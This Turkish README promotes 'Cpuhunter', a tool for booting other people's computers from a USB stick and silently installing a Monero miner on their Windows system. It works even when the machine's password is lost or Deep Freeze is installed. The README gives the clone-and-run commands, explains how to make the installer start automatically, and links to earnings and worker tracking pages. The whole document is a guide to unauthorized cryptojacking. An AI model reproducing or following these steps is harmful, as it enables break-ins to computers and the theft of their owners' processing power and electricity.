# Cpuhunter

![Usb live linux 2 windows monero miner](https://image.ibb.co/gPWncJ/usb_linux_100672302_primary_idge.jpg)

Şifresi kaybolmuş ya da deep freeze yüklü olsa bile istisnasız tüm bilgisayarlar birer para basma makinasıdır. 

Bırakın bilgisayarlar sizin için çalışsın. 

# Neler gerekli

* Monero cüzdan adresi (Ödemelerinizi almak için, [Mymonero.com](https://mymonero.com) adresinden kolayca oluşturabilirsiniz). 
* Usb bellek. 

# Kurulum 

İki kurulum seçeneği bulunmaktadır. 

# 1- Herşey hazır imaj dosyasını indirin (kolay kurulum) (torrent indirmesi)

[Cpuhunter Os imaj dosyası](https://yadi.sk/d/dNN415il3Yse5h)nı indirin ve [Win32 Disk Imager](https://www.gezginler.net/indir/win32-disk-imager.html) programı ile usb'ye yazdırın. Daha sonrasında bilgisayarınızı hazırlamış olduğunuz usb'den boot edin. 

Son olarak linux komut satırına (terminal) aşağıdaki komutu girin:
```
rm -rf /$USER/cpuhunter; git clone https://github.com/lukacci/cpuhunter /$USER/cpuhunter
```

Artık her şey hazır. 

İlk kurulumda monero cüzdanınızı kaydetmeniz istenecek. Bu işlemi geçtikten sonra Linux'ten Windows'a monero miner yazılımını yüklemek için usb'den yeniden başlatmanız yeterlidir. Sistem başlangıcında yükleme işlemleri otomatik olarak başlayacak ve tamamlancaktır.


# 2- Kendi hazırladığınız bootable usb linuxe yükleyin (profesyoneller için) 

Usb'ye linux yükleyin ve aşağıdaki komutları çalıştırın. 

```
sudo apt-get install python3 geany
rm -rf /$USER/cpuhunter; git clone https://github.com/lukacci/cpuhunter /$USER/cpuhunter
```

Çalıştırma komutu:
```
python3 /$USER/cpuhunter/exeinstaller.py
```
Üstteki komutunu başlangıca eklerseniz imaj dosyasında olduğu gibi bilgisayar açıldığında yazılım otomatik olarak işlem yapmaya başlayacaktır. 

# Monero cüzdanı nereye kaydedilecek?
Bilgisayarı usb'den boot ettiğinizde karşınıza otomatik olarak config.json dosyası açılacak. Wallet kısmı karşısına monero cüzdanınızı girmeniz yeterlidir. 

# Kazançların takibi
Online pc listesi: http://reed171.com/h.aspx?wallet=monero_adresiniz

Kazanç takip adresi: https://xmr.nanopool.org/account/[monero_adresiniz]

[Örnek rapor](https://xmr.nanopool.org/account/46CQwJTeUdgRF4AJ733tmLJMtzm8BogKo1unESp1UfraP9RpGH6sfKfMaE7V3jxpyVQi6dsfcQgbvYMTaB1dWyDMUkasg3S)

Örnek göstergeler
==================
 Hashsrate istatistikleri:
![](https://image.ibb.co/mSdKWd/hashrateler.png)

 Workers'lar:
![](https://image.ibb.co/h0L54y/ornek_kullanim.png)


# Ödemelerin alınması
1 monero kazandığınızda [mymonero.com](https://mymonero.com) hesabınıza geçecektir. Dolar'a ya da TL'ye çevirip banka hesabınıza aktarabilirsiniz. 

# Ek açıklamalar
* ÖNEMLİ: Bilgisayara yüklendikten sonra takip adresinde gözükmesi biraz zaman alabilir. Bunun nedeni Nanopool ilk hashrate ile değil kabul edilen ilk hashrate sonrası bilgisayarı sisteme yansıtıyor. 

* Monero neredeyse tüm borsalarda işlem görmekte olan gizliliğe dayalı güvenilir bir altcoindir. Gelecekte de fiyatının oldukça artması beklenmektedir. 
* Mining yazılımına otomatik güncelleme desteği eklenmiştir. Yani monero bazı durumlarda algoritmasını değiştirir ve eski yazılımlar işlevsiz hale gelir. Bu tarz durumlarda mining yazılımı otomatik olarak güncellenecektir. 
* Geliştirici komisyonu %2'dir. Mymonero.com ya da Nanopool.com kazançlarınızdan düşmemektedir. 
* Worker id'ler otomatik olarak oluşturulmaktadır. 
* Ne kadar kazanç elde ettiğinizi detaylı olarak takip edebilirsiniz. 
* Linux'te gerekli işlem yapıldığında yazılımın Windows'a başarılı bir şekilde yüklendiği sağ üst köşede çıkan bildirimden anlaşılabilir. 
  * "+" işareti başarılı "-" işareti ise başarısız olduğu anlamına gelir.  
  * İşlem detayları log klasörüne kaydedilir. 

  
  
